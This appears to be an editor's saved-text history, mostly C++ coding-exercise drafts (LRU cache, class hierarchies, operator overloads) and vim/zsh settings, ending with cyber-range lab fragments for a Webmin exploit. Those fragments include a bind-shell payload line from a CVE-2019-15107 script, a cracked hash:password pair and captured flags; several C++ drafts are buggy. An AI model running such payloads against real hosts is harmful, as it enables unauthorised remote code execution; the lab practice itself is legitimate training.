5f8782fd6286198c6d62a77220d5d551|file:///home/neo/cplusplus/hr.cpp|24|9|V|cpp
	        static int m_cur_id{0};
1ffb3d2712e79f3d0fc87461f729d9b6|file:///home/neo/cplusplus/hr.cpp|55|13|V|cpp
	            std::cin >> m_cur_id;
17efaff8cd90f9cb558ae666dcc47297|file:///home/neo/cplusplus/hr.cpp|7|1|V|cpp
	
	class Person{
	    protected:
	        std::string m_name;
	        int m_age;
	    public:
	        Person(const std::string &name = "", int age = 0) 
	            : m_name{name}, m_age{age}
	        {}
	
	        virtual void getdata(){}
	        virtual void putdata(){}
	};
	
	class Professor : public Person{
	    private:
	        int m_publications;
	        static int m_cur_id;
	        int m_id;
	    public:
	        Professor() {
	        }
	
	        virtual void getdata(){
	            std::cin >> m_name >> m_age >> m_publications;
	            m_id = ++m_cur_id;
	        }
	
	        virtual void putdata(){
	            std::cout << m_name << ' ' << m_age << ' ' <<  m_publications << ' ' << m_id;
	        }
	
	};
	
	int Professor::m_cur_id{0};
	
	class Student : public Person{
	    private:
	        int m_marks[6];
	        static int m_cur_id;
	        int m_id;
	    public:
	        Student() = default;
	
	        virtual void getdata(){
	            std::cin >> m_name >> m_age;
	            for (int i = 0; i < 6; i ++)
	                std::cin >> m_marks[i];
	            m_id = ++m_cur_id;
	        }
	
	        virtual void putdata(){
	            int sum{0};
	            for (int i = 0; i < 6; i ++){
	                sum += m_marks[i];
	            }
	            std::cout << m_name << ' ' << m_age << ' ' << sum << ' ' << m_id;
	        }
	};
	
	int Student::m_cur_id = 0;
	
94dd80b83f106c046ad24e875a017aaf|file:///home/neo/cplusplus/hr.cpp|1|1|V|cpp
	#include <iostream>
	#include <cmath>
	#include <cstdio>
	#include <vector>
	#include <iostream>
	#include <algorithm>
	using namespace std;
	
	class Person{
	    protected:
	        std::string m_name;
	        int m_age;
	    public:
	        Person(const std::string &name = "", int age = 0) 
	            : m_name{name}, m_age{age}
	        {}
	
	        virtual void getdata(){}
	        virtual void putdata(){}
	};
	
	class Professor : public Person{
	    private:
	        int m_publications;
	        static int m_cur_id;
	        int m_id;
	    public:
	        Professor() {
	        }
	
	        virtual void getdata(){
	            std::cin >> m_name >> m_age >> m_publications;
	            m_id = ++m_cur_id;
	        }
	
	        virtual void putdata(){
	            std::cout << m_name << ' ' << m_age << ' ' <<  m_publications << ' ' << m_id;
	        }
	
	};
	
	int Professor::m_cur_id{0};
	
	class Student : public Person{
	    private:
	        int m_marks[6];
	        static int m_cur_id;
	        int m_id;
	    public:
	        Student() = default;
	
	        virtual void getdata(){
	            std::cin >> m_name >> m_age;
	            for (int i = 0; i < 6; i ++)
	                std::cin >> m_marks[i];
	            m_id = ++m_cur_id;
	        }
	
	        virtual void putdata(){
	            int sum{0};
	            for (int i = 0; i < 6; i ++){
	                sum += m_marks[i];
	            }
	            std::cout << m_name << ' ' << m_age << ' ' << sum << ' ' << m_id;
	        }
	};
	
	int Student::m_cur_id = 0;
	
	int main(){
	
	    int n, val;
	    cin>>n; //The number of objects that is going to be created.
	    Person *per[n];
	
	    for(int i = 0;i < n;i++){
	
	        cin>>val;
	        if(val == 1){
	            // If val is 1 current object is of type Professor
	            per[i] = new Professor;
	
	        }
	        else per[i] = new Student; // Else the current object is of type Student
	
	        per[i]->getdata(); // Get the data from the user.
	
	    }
	
	    for(int i=0;i<n;i++)
	        per[i]->putdata(); // Print the required output for each object.
	
	    return 0;
	
	}
c375850c279f4ba4988c1d8d6c015940|file:///home/neo/cplusplus/hr.cpp|32|5|V|cpp
	    private:
8a66b73ec11ff0d2380fd1d4b9aee6c1|file:///home/neo/cplusplus/hr.cpp|33|36|v|cpp
	{capacity}
7e59815f2918b8e3e48c2487622fe79d|file:///home/neo/cplusplus/hr.cpp|33|32|v|cpp
	: cp = capacity;
d60c7860b8052cb022e4b0e1b00e2244|file:///home/neo/cplusplus/hr.cpp|40|13|V|cpp
	            mp.find(key)->value = value;
9d8bece97602d14b5eaeab4eed4ea90f|file:///home/neo/cplusplus/hr.cpp|39|13|V|cpp
	            Node node;
8b47cdbe6aa791891c00c9b62615215e|file:///home/neo/cplusplus/hr.cpp|40|1|V|cpp
	                (*it).second->value = value;
edfea02ca9cc1d12d58621d357879d53|file:///home/neo/cplusplus/hr.cpp|41|17|V|cpp
	                (*it).second->key = key;
96e89a298e0a9f469b9ae458d6afae9f|file:///home/neo/cplusplus/hr.cpp|45|29|v|cpp
	head
ca49cf39f55ff6e8fbd3c13803c6c0f3|file:///home/neo/cplusplus/hr.cpp|58|21|^v|cpp
	auto it = mp.find(key) 
6a3fac7d07f7676308b228210599e09c|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if ( auto it = mp.find(key);  it != mp.end()){
	                (*it).second->key = key;
	                (*it).second->value = value;
	            } else{
	                Node node{NULL, head, key, value};
	                mp[key] = &node;
	                head = mp[key];
	                if (mp.size() > cp){
	                    tail->prev->next = NULL;
	                    tail = tail->prev;
	                    mp.erase(key);
	                }
	             
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
7601ba3d07ea4e80d1c97b2cd6410e08|file:///home/neo/cplusplus/hr.cpp|51|21|V|cpp
	                    mp.erase(key);
f08a3914928a1dbc51d6d30e19660814|file:///home/neo/cplusplus/hr.cpp|48|17|V|cpp
	                if ()
cda60e7e322e14b696d02e3471f615f9|file:///home/neo/cplusplus/hr.cpp|47|17|V|cpp
	                head = mp[key];
5d90635176df1a6a68c3a2995e933c32|file:///home/neo/cplusplus/hr.cpp|46|24|v|cpp
	mp[key];
b88733622ee4f4fca9e1fe2fc0e31bae|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if ( auto it = mp.find(key);  it != mp.end()){
	                (*it).second->key = key;
	                (*it).second->value = value;
	            } else{
	                Node *node = new Node(NULL, head, key, value);
	                head = node;
	                if (mp.size() == 0)
	                    tail = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    mp.erase(tail->key);
	                    tail->prev->next = NULL;
	                    tail = tail->prev;
	                }
	            }
	        }
	
4a2dd1639f8f05bd753424caa39bda58|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if ( auto it = mp.find(key);  it != mp.end()){
	                (*it).second->key = key;
	                (*it).second->value = value;
	            } else{
	                Node *node = new Node(NULL, head, key, value);
	                head = node;
	                if (mp.size() == 0)
	                    tail = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    mp.erase(tail->key);
	                    tail->prev->next = NULL;
	                    tail = tail->prev;
	                }
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
a25da27260399662af5de94d27408968|file:///home/neo/cplusplus/hr.cpp|45|31|V|cpp
	                Node *node = new Node(NULL, head, key, value);
	                head = node;
	                if (mp.empty())
	                    tail = node;
	                mp[key] = node;
3f37ee9af06f3749888432690d3a8ffd|file:///home/neo/cplusplus/hr.cpp|47|17|V|cpp
	                it->second->key = key;
a244349e681a06bae659a80d789f4619|file:///home/neo/cplusplus/hr.cpp|49|21|v|cpp
	it->second
2a73ee0f55a576261d5b1c246dc2e7d8|file:///home/neo/cplusplus/hr.cpp|54|17|V|cpp
	                cur->next->prev = cur->prev;
cae043f278542b8d6c84826974b33a88|file:///home/neo/cplusplus/hr.cpp|64|21|V|cpp
	                    tail = tail->prev;
1895bdeb0dd5ba668d80b661e870ae62|file:///home/neo/cplusplus/hr.cpp|40|9|V|cpp
	        virtual void set(int key, int value){
07c85de44989a5b89728b7eab07133b8|file:///home/neo/cplusplus/hr.cpp|41|9|V|cpp
	            Node *node = new Node(NULL, head, key, value);
	            head = node;
d9ac085588caf63769d9871c594fdf0d|file:///home/neo/cplusplus/hr.cpp|43|17|V|cpp
	                Node *node = new Node(NULL, head, key, value);
	                head = node;
	                tail = node;
6347652a67047825598f1240cf09f4d2|file:///home/neo/cplusplus/hr.cpp|46|13|V|cpp
	            mp[key] = node;
e28af6efeedb520bfe06c0366c4cadd2|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if (mp.empty()){
	                Node *node = new Node(key, value);
	                head = node;
	                tail = node;
	                mp[key] = node;
	                return;
	            }
	            if ( auto it = mp.find(key);  it != mp.end()){
	                Node *cur = it->second;
	                cur->value = value;
	                if (cur == head)
	                    return;
	                if (cur == tail)
	                    tail = cur->prev;
	                else
	                    cur->next->prev = cur->prev;
	                cur->prev->next = cur->next;
	                cur->next = head;
	                head = cur;
	                cur->prev = NULL;
	            
	            } else{
	                Node *node = new Node(NULL, head, key, value);
	                head->prev = node;
	                head = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    tail = tail->prev;
	                    mp.erase(tail->next->key);
	                    delete tail->next;
	                    tail->next = NULL;
	                }
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
6c3e226b4d4795d518ab341b0824ec29|file:///home/neo/cplusplus/hr.cpp|63|39|v|cpp
	NULL
99386ef74072afb6d888760760abdba4|file:///home/neo/cplusplus/hr.cpp|57|17|V|cpp
	                cur->prev->next = cur->next;
5584a39e0838df36a289b56a97926709|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if (mp.empty()){
	                Node *node = new Node(key, value);
	                head = node;
	                tail = node;
	                mp[key] = node;
	                return;
	            }
	            if ( auto it = mp.find(key);  it != mp.end()){
	                Node *cur = it->second;
	                cur->value = value;
	                if (cur == head)
	                    return;
	                cur->prev->next = cur->next;
	                if (cur == tail)
	                    tail = tail->prev;
	                else
	                    cur->next->prev = cur->prev;
	                cur->next = head;
	                head = cur;
	                cur->prev = NULL;
	            
	            } else{
	                Node *node = new Node(head->prev, head, key, value);
	                head->prev = node;
	                head = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    tail = tail->prev;
	                    mp.erase(tail->next->key);
	                    delete tail->next;
	                    tail->next = NULL;
	                }
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
	
15210588ce459cb3b6597d30140c51d7|file:///home/neo/cplusplus/hr.cpp|59|17|V|cpp
	                cur->prev = NU
ded76e789546082f566946f300158961|file:///home/neo/cplusplus/hr.cpp|60|17|V|cpp
	                cur->prev = NULL;
b2a7ec9db997d3cdc7308000cd4debfb|file:///home/neo/cplusplus/hr.cpp|31|1|V|cpp
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if (mp.empty()){
	                Node *node = new Node(key, value);
	                head = node;
	                tail = node;
	                mp[key] = node;
	                return;
	            }
	            if ( auto it = mp.find(key);  it != mp.end()){
	                Node *cur = it->second;
	                cur->value = value;
	                if (cur == head)
	                    return;
	                cur->prev->next = cur->next;
	                if (cur == tail)
	                    tail = tail->prev;
	                else
	                    cur->next->prev = cur->prev;
	                cur->next = head;
	                cur->prev = NULL;
	                head->prev = cur;
	                head = cur;
	            } else{
	                Node *node = new Node(NULL, head, key, value);
	                head->prev = node;
	                head = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    tail = tail->prev;
	                    mp.erase(tail->next->key);
	                    delete tail->next;
	                    tail->next = NULL;
	                }
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
88162ec254ad53f1e674880353d48b8a|file:///home/neo/cplusplus/hr.cpp|45|4|V|cpp
	#include <iostream>
	#include <vector>
	#include <map>
	#include <string>
	#include <algorithm>
	#include <set>
	#include <cassert>
	using namespace std;
	
	struct Node{
	   Node* next;
	   Node* prev;
	   int value;
	   int key;
	   Node(Node* p, Node* n, int k, int val):prev(p),next(n),key(k),value(val){};
	   Node(int k, int val):prev(NULL),next(NULL),key(k),value(val){};
	};
	
	class Cache{
	   
	   protected: 
	       std::map<int,Node*> mp; //map the key to the node in the linked list
	       int cp;  //capacity
	       Node* tail; // double linked list tail pointer
	       Node* head; // double linked list head pointer
	       virtual void set(int, int) = 0; //set function
	       virtual int get(int) = 0; //get function
	
	};
	
	class LRUCache : public Cache{
	    public:
	        LRUCache(int capacity) 
	        {
	            cp = capacity;
	            tail = NULL;
	            head = NULL;
	        }
	
	        virtual void set(int key, int value){
	            if (mp.empty()){
	                Node *node = new Node(key, value);
	                head = node;
	                tail = node;
	                mp[key] = node;
	                return;
	            }
	            if ( auto it = mp.find(key);  it != mp.end()){
	                Node *cur = it->second;
	                cur->value = value;
	                if (cur == head)
	                    return;
	                cur->prev->next = cur->next;
	                if (cur == tail)
	                    tail = tail->prev;
	                else
	                    cur->next->prev = cur->prev;
	                cur->next = head;
	                cur->prev = NULL;
	                head->prev = cur;
	                head = cur;
	            } else{
	                Node *node = new Node(NULL, head, key, value);
	                head->prev = node;
	                head = node;
	                mp[key] = node;
	                if (mp.size() > cp){
	                    tail = tail->prev;
	                    mp.erase(tail->next->key);
	                    delete tail->next;
	                    tail->next = NULL;
	                }
	            }
	        }
	
	        virtual int get(int key){
	            auto it = mp.find(key);
	            return (it == mp.end() ? -1 : it->second->value);
	        }
	};
	
	int main() {
	   int n, capacity,i;
	   cin >> n >> capacity;
	   LRUCache l(capacity);
	   for(i=0;i<n;i++) {
	      string command;
	      cin >> command;
	      if(command == "get") {
	         int key;
	         cin >> key;
	         cout << l.get(key) << endl;
	      } 
	      else if(command == "set") {
	         int key, value;
	         cin >> key >> value;
	         l.set(key,value);
	      }
	   }
	   return 0;
	}
74b9bde3a0f2ad036e579bd392bb2718|file:///home/neo/cplusplus/hr.cpp|9|8|V|cpp
	       vector<vector<int>> m_arr;
92eda5aecec12eae27f326c07d61e33d|file:///home/neo/cplusplus/hr.cpp|14|32|v|cpp
	m_arr
e779846cbb8a0efafd22779d2dd1f3e4|file:///home/neo/cplusplus/hr.cpp|19|12|V|cpp
	           ret.a.push_back(v);
de026b94f31848335dd1460fa34d7072|file:///home/neo/cplusplus/hr.cpp|8|1|V|cpp
	class Matrix{
	   public:
	       vector<vector<int>> a;
	       Matrix operator+(const Matrix &m){
	           Matrix ret;
	           for (int i = 0; i < a.size(); i++){
	               vector<int> v{};
	               for (int j = 0; j < a[0].size(); j++)
	                   v.push_back(a[i][j] + m.a[i][j]);
	               ret.a.push_back(v);
	           }
	           return ret;
	       }
	};
33ba4b2c1ead26a969adfb42b2774ed3|file:///home/neo/cplusplus/hr.cpp|1|1|V|cpp
	#include <cmath>
	#include <cstdio>
	#include <vector>
	#include <iostream>
	#include <algorithm>
	using namespace std;
	
	class Matrix{
	   public:
	       vector<vector<int>> a;
	       Matrix &operator+(const Matrix &m){
	           Matrix ret;
	           for (int i = 0; i < a.size(); i++){
	               vector<int> v{};
	               for (int j = 0; j < a[0].size(); j++)
	                   v.push_back(a[i][j] + m.a[i][j]);
	               ret.a.push_back(v);
	           }
	           return ret;
	       }
	};
	
	
	int main () {
	   int cases,k;
	   cin >> cases;
	   for(k=0;k<cases;k++) {
	      Matrix x;
	      Matrix y;
	      Matrix result;
	      int n,m,i,j;
	      cin >> n >> m;
	      for(i=0;i<n;i++) {
	         vector<int> b;
	         int num;
	         for(j=0;j<m;j++) {
	            cin >> num;
	            b.push_back(num);
	         }
	         x.a.push_back(b);
	      }
	      for(i=0;i<n;i++) {
	         vector<int> b;
	         int num;
	         for(j=0;j<m;j++) {
	            cin >> num;
	            b.push_back(num);
	         }
	         y.a.push_back(b);
	      }
	      result = x+y;
	      for(i=0;i<n;i++) {
	         for(j=0;j<m;j++) {
	            cout << result.a[i][j] << " ";
	         }
	         cout << endl;
	      }
	   }  
	   return 0;
	}
ab4488dfe41d2dd7dc89227cf64269b1|file:///home/neo/cplusplus/hr.cpp|34|5|V|cpp
	    return{}
27285028b69823e83fa34a16716e0a34|file:///home/neo/cplusplus/hr.cpp|33|1|V|cpp
	Complex operator+(const Complex &a, const Complex &b){
	    Complex c;
	    c.a = a.a + b.a;
	    c.b = a.b + b.b;
	    return c;
	}
	
	std::ostream &operator<<(std::ostream &out, const Complex &c){
	    out << c.a << "+i" << c.b;
	    return out;
	}
4322207b9e231cea643857e035af3e99|file:///home/neo/cplusplus/hr.cpp|1|1|V|cpp
	#include<iostream>
	
	using namespace std;
	
	class Complex
	{
	public:
	    int a,b;
	    void input(string s)
	    {
	        int v1=0;
	        int i=0;
	        while(s[i]!='+')
	        {
	            v1=v1*10+s[i]-'0';
	            i++;
	        }
	        while(s[i]==' ' || s[i]=='+'||s[i]=='i')
	        {
	            i++;
	        }
	        int v2=0;
	        while(i<s.length())
	        {
	            v2=v2*10+s[i]-'0';
	            i++;
	        }
	        a=v1;
	        b=v2;
	    }
	};
	
	Complex operator+(const Complex &a, const Complex &b){
	    Complex c;
	    c.a = a.a + b.a;
	    c.b = a.b + b.b;
	    return c;
	}
	
	std::ostream &operator<<(std::ostream &out, const Complex &c){
	    out << c.a << "+i" << c.b;
	    return out;
	}
	int main()
	{
	    Complex x,y;
	    string s1,s2;
	    cin>>s1;
	    cin>>s2;
	    x.input(s1);
	    y.input(s2);
	    Complex z=x+y;
	    cout<<z<<endl;
	}
0a9cc414d7e5457b45b73310b57e9271|file:///home/neo/cplusplus/hr.cpp|16|25|v|cpp
	<Workshop, n>
fdaa6470d4e78aa942cc05948fc28c13|file:///home/neo/cplusplus/hr.cpp|16|5|V|cpp
	    std::array<Workshop, n> workshops;
44bbdb7dd8aaa24d42cccf879cd6fecc|file:///home/neo/cplusplus/hr.cpp|17|5|V|cpp
	    Workshop *workshops = new Workshop[n];
92d1ef15f6f76a6407830b427041978a|file:///home/neo/cplusplus/hr.cpp|23|5|V|cpp
	    w.workshops Workshop[n];
b758c02ddbf11cf9520bb8261db78c3c|file:///home/neo/cplusplus/hr.cpp|18|5|V|cpp
	    vector<Workshop> workshops;
6e1b62009d04e26fc2fdeb449dc067f0|file:///home/neo/cplusplus/hr.cpp|17|31|v|cpp
	 = new Workshop[n];
bf2f5795a35e4a2cf96e9b51caf381c3|file:///home/neo/cplusplus/hr.cpp|20|1|V|cpp
	Available_Workshops* initialize (int start_time[], int duration[], int n){
	    Available_Workshops *w;
	    w->n = n;
	    for (int i = 0; i < n; i++){
	        w->workshops.push_back(Workshop{start_time[i], duration[i], start_time[i] + duration[i]});
	    }
	    return w;
	}
	
	int CalculateMaxWorkshops(Available_Workshops* ptr){
	    std::sort(ptr->workshops.begin(), ptr->workshops.end(), [](const Workshop &w1, const Workshop &w2){
	            return w1.end_time < w2.end_time;
	            });
	    int count{0};
	    int end{0};
	    for (int i = 0; i < ptr->n; i++){
	        if (ptr->workshops[i].start_time > end){
	            count++;
	            end = ptr->workshops[i].start_time;
	        }
	    }
	    return count;
	}
addf3480da86cdcd2f397fa26443c06c|file:///home/neo/cplusplus/hr.cpp|8|1|V|cpp
	#include <vector>
	struct Workshop{
	    int start_time;
	    int duration;
	    int end_time;
	};
	
	struct Available_Workshops{
	    int n;
	    vector<Workshop> workshops;
	};
	
	Available_Workshops* initialize (int start_time[], int duration[], int n){
	    Available_Workshops *w;
	    w->n = n;
	    for (int i = 0; i < n; i++){
	        w->workshops.push_back(Workshop{start_time[i], duration[i], start_time[i] + duration[i]});
	    }
	    return w;
	}
	
	int CalculateMaxWorkshops(Available_Workshops* ptr){
	    std::sort(ptr->workshops.begin(), ptr->workshops.end(), [](const Workshop &w1, const Workshop &w2){
	            return w1.end_time < w2.end_time;
	            });
	    int count{0};
	    int end{0};
	    for (int i = 0; i < ptr->n; i++){
	        if (ptr->workshops[i].start_time > end){
	            count++;
	            end = ptr->workshops[i].start_time;
	        }
	    }
	    return count;
	}
	
87a18e1ca1504b9b1cfc90aa00ba20c6|file:///home/neo/cplusplus/hr.cpp|24|1|V|cpp
	        w->workshops[i] = Workshop{start_time[i], duration[i], start_time[i] + duration[i]};
a1c16f67d1a53645f803ef334adf63b5|file:///home/neo/cplusplus/hr.cpp|21|1|V|cpp
	    Available_Workshops *w = new Available_Workshops;
	    w.n = n;
8f596f5ceed2c94e510b39e7c954a8c9|file:///home/neo/cplusplus/hr.cpp|22|5|V|cpp
	    w.n = n;
63de1ce326bf6acc0a8c58e9d99b5b98|file:///home/neo/cplusplus/hr.cpp|21|1|V|cpp
	    Available_Workshops *w = new Available_Workshops;
	    w->n = n;
def4636b57fa8c5e9be0fc2e52acb679|file:///home/neo/cplusplus/hr.cpp|15|1|V|cpp
	struct Available_Workshops{
	    int n;
	    vector<Workshop> workshops;
	};
	
	Available_Workshops* initialize (int start_time[], int duration[], int n){
	    Available_Workshops *w = new Available_Workshops();
	    w->n = n;
	    for (int i = 0; i < n; i++){
	        w->workshops.push_back(Workshop{start_time[i], duration[i], start_time[i] + duration[i]});
	    }
	    return w;
	}
	
	int CalculateMaxWorkshops(Available_Workshops* ptr){
	    std::sort(ptr->workshops.begin(), ptr->workshops.end(), [](const Workshop &w1, const Workshop &w2){
	            return w1.end_time < w2.end_time;
	            });
	    int count{0};
	    int end{0};
	    for (int i = 0; i < ptr->n; i++){
	        if (ptr->workshops[i].start_time >= end){
	            count++;
	            end = ptr->workshops[i].start_time;
	        }
	    }
	    return count;
	}
e177de67e6c17881e28a187c609c9cc7|file:///home/neo/cplusplus/hr.cpp|8|1|V|cpp
	#include <vector>
	struct Workshop{
	    int start_time;
	    int duration;
	    int end_time;
	};
	
	struct Available_Workshops{
	    int n;
	    vector<Workshop> workshops;
	};
	
	Available_Workshops* initialize (int start_time[], int duration[], int n){
	    Available_Workshops *w = new Available_Workshops();
	    w->n = n;
	    for (int i = 0; i < n; i++){
	        w->workshops.push_back(Workshop{start_time[i], duration[i], start_time[i] + duration[i]});
	    }
	    return w;
	}
	
	int CalculateMaxWorkshops(Available_Workshops* ptr){
	    std::sort(ptr->workshops.begin(), ptr->workshops.end(), [](const Workshop &w1, const Workshop &w2){
	            return w1.end_time < w2.end_time;
	            });
	    int count{0};
	    int end{0};
	    for (int i = 0; i < ptr->n; i++){
	        if (ptr->workshops[i].start_time >= end){
	            count++;
	            end = ptr->workshops[i].start_time;
	        }
	    }
	    return count;
	}
9f106c3db393da7985ac2570aa3e65a3|file:///tmp/neomutt-neo-1000-32393-14731391525825353233|4|1|V|mail
	CY35002001950000357008862104
37b68a7c0e062ee91c5d4c6d61fad964|file:///home/neo/.vimrc|379|1|V|vim
	" normal/insert
	<Plug>MarkdownPreview
	<Plug>MarkdownPreviewStop
	<Plug>MarkdownPreviewToggle
deeb03327cc6f33b8c52f8b1cd752130|file:///home/neo/.vimrc|379|1|V|vim
	" example
c28f7f87da707b8ff6200b07c0f6a62e|file:///home/neo/.vimrc|292|1|V|vim
	"
	"" Markdown preview
	" set to 1, nvim will open the preview window after entering the markdown buffer
	" default: 0
	let g:mkdp_auto_start = 1
	
	" set to 1, the nvim will auto close current preview window when change
	" from markdown buffer to another buffer
	" default: 1
	let g:mkdp_auto_close = 1
	
	" set to 1, the vim will refresh markdown when save the buffer or
	" leave from insert mode, default 0 is auto refresh markdown as you edit or
	" move the cursor
	" default: 0
	let g:mkdp_refresh_slow = 0
	
	" set to 1, the MarkdownPreview command can be use for all files,
	" by default it can be use in markdown file
	" default: 0
	let g:mkdp_command_for_global = 0
	
	" set to 1, preview server available to others in your network
	" by default, the server listens on localhost (127.0.0.1)
	" default: 0
	let g:mkdp_open_to_the_world = 0
	
	" use custom IP to open preview page
	" useful when you work in remote vim and preview on local browser
	" more detail see: https://github.com/iamcco/markdown-preview.nvim/pull/9
	" default empty
	let g:mkdp_open_ip = ''
	
	" specify browser to open preview page
	" default: ''
	let g:mkdp_browser = 'brave-browser'
	
	" set to 1, echo preview page url in command line when open preview page
	" default is 0
	let g:mkdp_echo_preview_url = 0
	
	" a custom vim function name to open preview page
	" this function will receive url as param
	" default is empty
	let g:mkdp_browserfunc = ''
	
	" options for markdown render
	" mkit: markdown-it options for render
	" katex: katex options for math
	" uml: markdown-it-plantuml options
	" maid: mermaid options
	" disable_sync_scroll: if disable sync scroll, default 0
	" sync_scroll_type: 'middle', 'top' or 'relative', default value is 'middle'
	"   middle: mean the cursor position alway show at the middle of the preview page
	"   top: mean the vim top viewport alway show at the top of the preview page
	"   relative: mean the cursor position alway show at the relative positon of the preview page
	" hide_yaml_meta: if hide yaml metadata, default is 1
	" sequence_diagrams: js-sequence-diagrams options
	" content_editable: if enable content editable for preview page, default: v:false
	let g:mkdp_preview_options = {
	    \ 'mkit': {},
	    \ 'katex': {},
	    \ 'uml': {},
	    \ 'maid': {},
	    \ 'disable_sync_scroll': 0,
	    \ 'sync_scroll_type': 'middle',
	    \ 'hide_yaml_meta': 1,
	    \ 'sequence_diagrams': {},
	    \ 'flowchart_diagrams': {},
	    \ 'content_editable': v:false
	    \ }
	
	" use a custom markdown style must be absolute path
	" like '/Users/username/markdown.css' or expand('~/markdown.css')
	let g:mkdp_markdown_css = ''
	
	" use a custom highlight style must absolute path
	" like '/Users/username/highlight.css' or expand('~/highlight.css')
	let g:mkdp_highlight_css = ''
	
	" use a custom port to start server or random for empty
	let g:mkdp_port = ''
	
	" preview page title
	" ${name} will be replace with the file name
	let g:mkdp_page_title = '„Äå${name}„Äç'
	
	nmap <C-s> <Plug>MarkdownPreview
	nmap <M-s> <Plug>MarkdownPreviewStop
	nmap <C-p> <Plug>MarkdownPreviewToggle
729659c3d1a89980909cc29e1bcf4d20|file:///home/neo/.zshrc|142|1|V|zsh
	bindkey '^ ' autosuggest-execute
50a7d4ffd2f3b75a92a76e053b1a5aa8|file:///home/neo/.vimrc|284|2|V|vim
	" Vimplug
	
	call plug#begin('~/.vim/plugged')
	
	call plug#end()
14754f13e5280c5d49d2ae536c2d57e2|file:///home/neo/cyberranges/work/webmin/scenario.md|6|16|v|vimwiki
	machine
b9f3f6b9ebcc8f0e92e7121a80517612|file:///home/neo/cyberranges/work/webmin/scenario.md|4|1|V|vimwiki
	
	<h2>Targets<\h2>
	The vulnerable host is running at 192.168.125.11.
	
	<h2>Objective<\h2>
	Enumerate the machine, find the vulnerable application and compromise it to gain access to the machine!
923777d9573d622c1877b9290962574c|file:///home/neo/cyberranges/work/webmin/scenario.md|3|1|V|vimwiki
	<h1>Vulnerable Machine #1<\h1>
	
	<h2>Targets<\h2>
	The vulnerable host is running at 192.168.125.11.
	
	<h2>Objective<\h2>
	Enumerate the machine, find the vulnerable application and compromise it to gain access to the machine!
f0d0011c86b8604bdc465f9f193711e9|file:///home/neo/cyberranges/work/webmin/scenario.md|6|1|V|vimwiki
	<h1>Vulnerable Machine #1</h1>
	
	<h2>Targets</h2>
	The vulnerable host is running at 192.168.125.11.
	
	<h2>Objective</h2>
	Enumerate the machine, find the vulnerable application and compromise it to gain access to the machine!
10a87deeae39c88cef4f80f5cfdb80de|file:///home/neo/cyberranges/work/webmin/scenario.md|10|35|v|vimwiki
	192.168.125.11.
52252cbf56c0f884e5fb132c0d02c7f9|file:///home/neo/cyberranges/work/webmin/scenario.md|3|1|V|vimwiki
	<h2>Scenario Information</h2>
	The host at 192.168.125.11 is running a vulnerable application. 
	
	<h2>Scenario pre-requisites/recommendations</h2>
	
	- Familiarity with service enumeration to discover vulnerable services using tools such as nmap (see **CyberStars Workshop 3**).
	- Familiarity with searching for and using publicly available exploits (see **Intro to Metasploit #1**, https://www.exploit-db.com/, https://www.google.com/ ).
	
	<h2>Further Reading</h2>
	https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
acfe22eeddf82266e32f8f17912d59fe|file:///home/neo/cyberranges/work/webmin/CVE_2019_15107.py|54|141|v|python
	9666
b98949f5e0f9e9082e9d8d6bf857e249|file:///home/neo/cyberranges/work/webmin/CVE_2019_15107.py|51|5|V|python
	    # url = sys.argv[1]
2cb732ad783f9b81874e63a1dd3a0a32|file:///home/neo/cyberranges/work/webmin/CVE_2019_15107.py|52|5|V|python
	    cmd = """ kill -9 10; python -c "import socket as a;s = a.socket();s.bind(('0.0.0.0',10000));s.listen(1);(r,z) = s.accept();exec(r.recv(999))" """
d47d75a8043749b110c1e32dde26d34e|file:///home/neo/cyberranges/dump.txt|1|1|V|text
	# Database dump (format): USERNAME:EMAIL:RIGHTS:SALT:HASH 
0052eba10927e2ec2605782b13b05608|file:///home/neo/cyberranges/dump.txt|1|1|V|text
	750568187710aab2078c10ab2efa95fb:abc123
667bf82cee6c260a9512ea97003d8eb5|file:///home/neo/cyberranges/work/webmin/flag.txt|1|6|v|text
	test_flag
316ba67d1f89a1d1c6b8d9997bfd80c0|file:///home/neo/cyberranges/work/webmin/flag.txt|1|6|v|text
	w3bm1n_pwn3d
686b869b0468dd186ace288ebdd03f33|file:///home/neo/cyberranges/work/producer.md|10|5|v|vimwiki
	./saltstack/CVE-2020-11652
